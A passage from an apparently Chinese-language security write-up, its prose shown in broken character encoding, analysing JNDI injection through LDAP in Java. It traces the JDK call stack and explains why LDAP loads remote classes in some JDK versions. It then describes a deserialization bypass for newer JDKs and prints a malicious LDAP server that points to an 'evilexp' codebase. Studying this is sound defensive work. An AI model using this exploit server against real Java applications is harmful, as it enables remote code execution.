</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                exception.printStackTrace();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//            }</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">result</span><span class="p">.</span><span class="na">sendSearchEntry</span><span class="p">(</span><span class="n">e</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">result</span><span class="p">.</span><span class="na">setResult</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">LDAPResult</span><span class="p">(</span><span class="n">0</span><span class="p">,</span><span class="w"> </span><span class="n">ResultCode</span><span class="p">.</span><span class="na">SUCCESS</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>JNDIDemo.java</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">ldap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.naming.InitialContext</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">JNDIDemo</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InitialContext</span><span class="w"> </span><span class="n">ctx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InitialContext</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ctx</span><span class="p">.</span><span class="na">lookup</span><span class="p">(</span><span class="s">&#34;ldap://127.0.0.1:1389/test&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><h2 id="0x04-åˆ†æ">0x04 åˆ†æ<a hidden class="anchor" aria-hidden="true" href="#0x04-åˆ†æ">#</a></h2>
<h3 id="ä½ç‰ˆæœ¬jdk--8u191">ä½ç‰ˆæœ¬jdk &lt; 8u191<a hidden class="anchor" aria-hidden="true" href="#ä½ç‰ˆæœ¬jdk--8u191">#</a></h3>
<p>åœ¨è·å–ä¸Šä¸‹æ–‡æ—¶ï¼Œæ ¹æ®<code>åè®®</code>ä¼šè·å–ä¸åŒçš„ä¸Šä¸‹æ–‡ï¼Œ</p>
<p><img loading="lazy" src="images/image-20250123170623186.png" alt="image-20250123170623186"  />
</p>
<p>è·Ÿè¿›<code>ResourceManager.getFactory()</code></p>
<p><img loading="lazy" src="images/image-20250123171237992.png" alt="image-20250123171237992"  />
</p>
<p><code>classSuffix</code>è¿™ä¸ªå€¼æ˜¯è·Ÿè¿›<code>åè®®åå­—</code>æ‹¼æ¥çš„ï¼Œç„¶åå»<code>å®ä¾‹åŒ–</code>è¿™ä¸ªç±»ï¼Œåé¢ä¼š<code>return factory;</code></p>
<p><img loading="lazy" src="images/image-20250123171148097.png" alt="image-20250123171148097"  />
</p>
<p>ç„¶åä¼šåˆ°<code>ldapURLContextFactory.getObjectInstance</code>ï¼Œè¿”å›ä¸€ä¸ª<code>ldapçš„ä¸Šä¸‹æ–‡(ldapURLContext)</code></p>
<p><img loading="lazy" src="images/image-20250123171654919.png" alt="image-20250123171654919"  />
</p>
<p>ç„¶ååç»­<code>this.getRootURLContext</code>è¿™é‡Œè°ƒç”¨çš„æ˜¯<code>ldapURLContext.getRootURLContext</code>ï¼Œ<code>var3</code>æ˜¯<code>LdapCtx</code>ï¼Œä¹Ÿå°±å¯¼è‡´åé¢å’Œrmiçš„èµ°å‘ä¸ä¸€æ ·äº†</p>
<p><img loading="lazy" src="images/image-20250123172354148.png" alt="image-20250123172354148"  />
</p>
<h4 id="c_lookup">c_lookup<a hidden class="anchor" aria-hidden="true" href="#c_lookup">#</a></h4>
<p>ç„¶åä¸€ç›´åˆ°<code>c_lookup</code>è¿™é‡Œï¼Œ<code>this.doSearchOnce</code>ä¼š<code>å‘ldapå‘é€è¯·æ±‚</code>è·å–å€¼ã€‚</p>
<p><img loading="lazy" src="images/image-20250123172947975.png" alt="image-20250123172947975"  />
</p>
<p>ç„¶å<code>ldapæœåŠ¡ç«¯</code>ï¼Œå°†è¿™ä¸ªå€¼ä¼ ç»™<code>clientç«¯</code></p>
<p><img loading="lazy" src="images/image-20250123173158100.png" alt="image-20250123173158100"  />
</p>
<p>ç„¶åä»è¿”å›çš„å€¼è·å–<code>attributes</code>å±æ€§ï¼Œæˆ‘ä»¬æ˜¯è®¾ç½®äº†<code>javaClassName</code>çš„ï¼Œæ‰€ä»¥è¿›å…¥</p>
<p><img loading="lazy" src="images/image-20250123173744920.png" alt="image-20250123173744920"  />
</p>
<p>è¿™é‡Œiféƒ½ä¸ä¼šè¿›ï¼Œåˆ°æœ€åä¸€ä¸ª<code>ä¸‰å…ƒè¡¨è¾¾å¼</code></p>
<p><img loading="lazy" src="images/image-20250123173954249.png" alt="image-20250123173954249"  />
</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">return</span><span class="w"> </span><span class="n">var1</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="o">!</span><span class="n">var1</span><span class="p">.</span><span class="na">contains</span><span class="p">(</span><span class="n">JAVA_OBJECT_CLASSES</span><span class="o">[</span><span class="n">2</span><span class="o">]</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="n">var1</span><span class="p">.</span><span class="na">contains</span><span class="p">(</span><span class="n">JAVA_OBJECT_CLASSES_LOWER</span><span class="o">[</span><span class="n">2</span><span class="o">]</span><span class="p">)</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">decodeReference</span><span class="p">(</span><span class="n">var0</span><span class="p">,</span><span class="w"> </span><span class="n">var2</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></div><p>ä¼šè¿›å…¥<code>decodeReference()</code>ï¼Œç„¶ååˆå§‹åŒ–ä¸€ä¸ª<code>Referenceå¯¹è±¡</code>å¹¶return</p>
<p><img loading="lazy" src="images/image-20250123174054553.png" alt="image-20250123174054553"  />
</p>
<p>ç„¶åå›åˆ°<code>c_lookup</code>ï¼Œè¿›å…¥<code>getObjectInstance()</code>ï¼Œå…¶åç»­é€»è¾‘å’Œ<code>rmi</code>æ˜¯<code>ä¸€æ ·</code>çš„</p>
<p><img loading="lazy" src="images/image-20250123174204328.png" alt="image-20250123174204328"  />
</p>
<p>ç„¶å<code>getObjectFactoryFromReference</code>ä¸­è§¦å‘åˆ©ç”¨</p>
<p><img loading="lazy" src="images/image-20250123174402564.png" alt="image-20250123174402564"  />
</p>
<h4 id="å°ç»“-1">å°ç»“<a hidden class="anchor" aria-hidden="true" href="#å°ç»“-1">#</a></h4>
<p>ç»è¿‡ä¸Šé¢çš„åˆ†æï¼Œæˆ‘ä»¬çŸ¥é“ldapå’Œrmiåœ¨è°ƒç”¨è¿œç¨‹æ¶æ„ç±»ä¸Šçš„è¿‡ç¨‹æ˜¯<code>æœ‰åŒºåˆ«çš„</code></p>
<p><strong>ldapè°ƒç”¨æ ˆ</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nl">c_lookup</span><span class="p">:</span><span class="n">1085</span><span class="p">,</span><span class="w"> </span><span class="n">LdapCtx</span><span class="w"> </span><span class="p">(</span><span class="n">com</span><span class="p">.</span><span class="na">sun</span><span class="p">.</span><span class="na">jndi</span><span class="p">.</span><span class="na">ldap</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">p_lookup</span><span class="p">:</span><span class="n">542</span><span class="p">,</span><span class="w"> </span><span class="n">ComponentContext</span><span class="w"> </span><span class="p">(</span><span class="n">com</span><span class="p">.</span><span class="na">sun</span><span class="p">.</span><span class="na">jndi</span><span class="p">.</span><span class="na">toolkit</span><span class="p">.</span><span class="na">ctx</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">lookup</span><span class="p">:</span><span class="n">177</span><span class="p">,</span><span class="w"> </span><span class="n">PartialCompositeContext</span><span class="w"> </span><span class="p">(</span><span class="n">com</span><span class="p">.</span><span class="na">sun</span><span class="p">.</span><span class="na">jndi</span><span class="p">.</span><span class="na">toolkit</span><span class="p">.</span><span class="na">ctx</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">lookup</span><span class="p">:</span><span class="n">205</span><span class="p">,</span><span class="w"> </span><span class="n">GenericURLContext</span><span class="w"> </span><span class="p">(</span><span class="n">com</span><span class="p">.</span><span class="na">sun</span><span class="p">.</span><span class="na">jndi</span><span class="p">.</span><span class="na">toolkit</span><span class="p">.</span><span class="na">url</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">lookup</span><span class="p">:</span><span class="n">94</span><span class="p">,</span><span class="w"> </span><span class="n">ldapURLContext</span><span class="w"> </span><span class="p">(</span><span class="n">com</span><span class="p">.</span><span class="na">sun</span><span class="p">.</span><span class="na">jndi</span><span class="p">.</span><span class="na">url</span><span class="p">.</span><span class="na">ldap</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">lookup</span><span class="p">:</span><span class="n">417</span><span class="p">,</span><span class="w"> </span><span class="n">InitialContext</span><span class="w"> </span><span class="p">(</span><span class="n">javax</span><span class="p">.</span><span class="na">naming</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">main</span><span class="p">:</span><span class="n">8</span><span class="p">,</span><span class="w"> </span><span class="n">JNDIDemo</span><span class="w"> </span><span class="p">(</span><span class="n">ldap</span><span class="p">)</span><span class="w">
</span></span></span></code></pre></div><p><strong>rmiè°ƒç”¨æ ˆ</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nl">decodeObject</span><span class="p">:</span><span class="n">475</span><span class="p">,</span><span class="w"> </span><span class="n">RegistryContext</span><span class="w"> </span><span class="p">(</span><span class="n">com</span><span class="p">.</span><span class="na">sun</span><span class="p">.</span><span class="na">jndi</span><span class="p">.</span><span class="na">rmi</span><span class="p">.</span><span class="na">registry</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">lookup</span><span class="p">:</span><span class="n">138</span><span class="p">,</span><span class="w"> </span><span class="n">RegistryContext</span><span class="w"> </span><span class="p">(</span><span class="n">com</span><span class="p">.</span><span class="na">sun</span><span class="p">.</span><span class="na">jndi</span><span class="p">.</span><span class="na">rmi</span><span class="p">.</span><span class="na">registry</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">lookup</span><span class="p">:</span><span class="n">205</span><span class="p">,</span><span class="w"> </span><span class="n">GenericURLContext</span><span class="w"> </span><span class="p">(</span><span class="n">com</span><span class="p">.</span><span class="na">sun</span><span class="p">.</span><span class="na">jndi</span><span class="p">.</span><span class="na">toolkit</span><span class="p">.</span><span class="na">url</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">lookup</span><span class="p">:</span><span class="n">417</span><span class="p">,</span><span class="w"> </span><span class="n">InitialContext</span><span class="w"> </span><span class="p">(</span><span class="n">javax</span><span class="p">.</span><span class="na">naming</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">main</span><span class="p">:</span><span class="n">9</span><span class="p">,</span><span class="w"> </span><span class="n">client</span><span class="w"> </span><span class="p">(</span><span class="n">rmi</span><span class="p">)</span><span class="w">
</span></span></span></code></pre></div><blockquote>
<p><code>var8.getFactoryClassLocation()</code>çš„æ£€æµ‹æ˜¯åœ¨<code>rmi</code>çš„<code>decodeObject</code>ä¸­ï¼Œè€Œ<code>ldapåè®®</code>æ˜¯è°ƒç”¨çš„<code>å…¶ä»–lookup</code>å¹¶ä¸ä¼šè°ƒç”¨<code>decodeObject</code>æ¥å®ç°è¿œç¨‹åŠ è½½ï¼Œ<code>ä¸¤è€…åè®®è°ƒç”¨æœºåˆ¶æ˜¯ä¸ä¸€æ ·çš„</code></p>
<p>æ‰€ä»¥åœ¨<code>8u113~8u190</code>è¿™æ®µ<code>com.sun.jndi.rmi.object.trustURLCodebase</code> é»˜è®¤å€¼ä¸º<code>false</code>ï¼Œ<code>ldapä¸å—å½±å“</code>ä¾ç„¶å¯ä»¥è°ƒç”¨<code>è¿œç¨‹æ¶æ„ç±»</code></p>
</blockquote>
<h3 id="é«˜ç‰ˆæœ¬jdk-1">é«˜ç‰ˆæœ¬jdk<a hidden class="anchor" aria-hidden="true" href="#é«˜ç‰ˆæœ¬jdk-1">#</a></h3>
<p>8u191ä»¥åï¼Œåœ¨è¿œç¨‹åŠ è½½ç±»æ—¶åŠ å…¥äº†<code>trustURLCodebase</code>çš„åˆ¤æ–­ï¼Œå½»åº•æœç»äº†è¿œç¨‹åŠ è½½æ¶æ„ç±»äº†ã€‚</p>
<p><img loading="lazy" src="images/image-20250123181345784.png" alt="image-20250123181345784"  />
</p>
<p><img loading="lazy" src="images/image-20250123181429793.png" alt="image-20250123181429793"  />
</p>
<h4 id="try1-ååºåˆ—åŒ–">try1 ååºåˆ—åŒ–<a hidden class="anchor" aria-hidden="true" href="#try1-ååºåˆ—åŒ–">#</a></h4>
<p>è¿˜æœ‰ä¸€ä¸ªç‚¹<code>decodeObject()</code>çš„ <code>deserializeObject()</code>ç¬¦åˆæ¡ä»¶ä¼šæŠŠ<code>ldapæœåŠ¡ç«¯</code>è¿”å›çš„æ•°æ®è¿›è¡Œ<code>ååºåˆ—åŒ–</code>ï¼Œæœ‰èƒ½åˆ©ç”¨çš„ä¾èµ–å°±èƒ½æ‰“gadgetå“‡ï¼</p>
<p><img loading="lazy" src="images/image-20250123182923797.png" alt="image-20250123182923797"  />
</p>
<p>ç»™<code>javaSerializedData</code>è®¾ç½®å€¼ï¼Œè¿›å…¥<code>deserializeObject()</code></p>
<p><img loading="lazy" src="images/image-20250123183748148.png" alt="image-20250123183748148"  />
</p>
<p>æˆ‘è¿™é‡Œè°ƒè¯•æœ‰ç‚¹é—®é¢˜ï¼Œä¸èƒ½æ­£å¸¸è°ƒè¯•åˆ°readObjectï¼Œå¯èƒ½æ˜¯ ä¸æ˜¯å®Œæ•´æºç çš„åŸå› ï¼Œä¸è¿‡æ˜¯æˆåŠŸååºåˆ—åŒ–äº†çš„</p>
<p>è¿™é‡Œvar0æ•°æ®å°±æ˜¯CC5çš„åºåˆ—åŒ–æ•°æ®</p>
<p><img loading="lazy" src="images/image-20250123183712837.png" alt="image-20250123183712837"  />
</p>
<p><img loading="lazy" src="images/image-20250123184127624.png" alt="image-20250123184127624"  />
</p>
<h4 id="demoä»£ç ">demoä»£ç <a hidden class="anchor" aria-hidden="true" href="#demoä»£ç ">#</a></h4>
<p>JNDIDemoè¿˜æ˜¯ä¸€æ ·çš„</p>
<p>LDAPServer</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">ldap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.unboundid.ldap.listener.InMemoryDirectoryServer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.unboundid.ldap.listener.InMemoryDirectoryServerConfig</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.unboundid.ldap.listener.InMemoryListenerConfig</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.unboundid.ldap.sdk.Entry</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.unboundid.ldap.sdk.LDAPException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.unboundid.ldap.sdk.LDAPResult</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.unboundid.ldap.sdk.ResultCode</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.unboundid.util.Base64</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.net.ServerSocketFactory</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.net.SocketFactory</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.net.ssl.SSLSocketFactory</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.net.InetAddress</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.net.MalformedURLException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.net.URL</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.text.ParseException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">LDAPServer</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">LDAP_BASE</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;dc=ldap&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="w"> </span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;http://127.0.0.1:4444/#evilexp&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">int</span><span class="w"> </span><span class="n">port</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">1389</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">InMemoryDirectoryServerConfig</span><span class="w"> </span><span class="n">config</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InMemoryDirectoryServerConfig</span><span class="p">(</span><span class="n">LDAP_BASE</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">config</span><span class="p">.</span><span class="na">setListenerConfigs</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">InMemoryListenerConfig</span><span class="p">(</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="s">&#34;listen&#34;</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">InetAddress</span><span class="p">.</span><span class="na">getByName</span><span class="p">(</span><span class="s">&#34;0.0.0.0&#34;</span><span class="p">),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">port</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">ServerSocketFactory</span><span class="p">.</span><span class="na">getDefault</span><span class="p">(),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">SocketFactory</span><span class="p">.</span><span class="na">getDefault</span><span class="p">(),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="p">(</span><span class="n">SSLSocketFactory</span><span class="p">)</span><span class="w"> </span><span class="n">SSLSocketFactory</span><span class="p">.</span><span class="na">getDefault</span><span class="p">()));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">config</span><span class="p">.</span><span class="na">addInMemoryOperationInterceptor</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">OperationInterceptor</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">URL</span><span class="p">(</span><span class="n">url</span><span class="p">)));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">InMemoryDirectoryServer</span><span class="w"> </span><span class="n">ds</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InMemoryDirectoryServer</span><span class="p">(</span><span class="n">config</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;Listening on 0.0.0.0:&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">port</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">ds</span><span class="p">.</span><span class="na">startListening</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">class</span> <span class="nc">OperationInterceptor</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">InMemoryOperationInterceptor</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">private</span><span class="w"> </span><span class="n">URL</span><span class="w"> </span><span class="n">codebase</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">public</span><span class="w"> </span><span class="nf">OperationInterceptor</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">URL</span><span class="w"> </span><span class="n">cb</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">this</span><span class="p">.</span><span class="na">codebase</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cb</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="cm">/**
</span></span></span><span class="line"><span class="cl"><span class="cm">         * {@inheritDoc}
</span></span></span><span class="line"><span class="cl"><span class="cm">         *
</span></span></span><span class="line"><span class="cl"><span class="cm">         * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)
</span></span></span><span class="line"><span class="cl"><span class="cm">         */</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">processSearchResult</span><span class="w"> </span><span class="p">(</span><span class="n">InMemoryInterceptedSearchResult</span><span class="w"> </span><span class="n">result</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">base</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">result</span><span class="p">.</span><span class="na">getRequest</span><span class="p">().</span><span class="na">getBaseDN</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Entry</span><span class="w"> </span><span class="n">e</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Entry</span><span class="p">(</span><span class="n">base</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">sendResult</span><span class="p">(</span><span class="n">result</span><span class="p">,</span><span class="w"> </span><span class="n">base</span><span class="p">,</span><span class="w"> </span><span class="n">e</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="n">e1</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">e1</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
